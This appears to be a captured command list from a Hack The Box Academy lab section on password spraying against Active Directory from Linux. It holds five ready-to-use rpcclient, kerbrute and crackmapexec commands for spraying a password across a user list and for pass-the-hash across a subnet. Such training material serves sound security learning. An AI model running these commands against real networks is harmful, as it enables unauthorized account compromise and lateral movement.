# Section 11: Internal Password Spraying - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1271
- Code/command blocks: 5

> Terminal output is omitted; only commands & scripts are captured.

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%{{PASSWORD}}" -c "getusername;quit" {{DC_IP}} | grep Authority; done
```

```bash
kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}}  {{PASSWORD}}
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERLIST}} -p {{PASSWORD}} | grep +
```

```bash
sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}}
```

```bash
sudo crackmapexec smb --local-auth {{SUBNET}} -u {{USERNAME}} -H {{NTLM_HASH}} | grep +
```
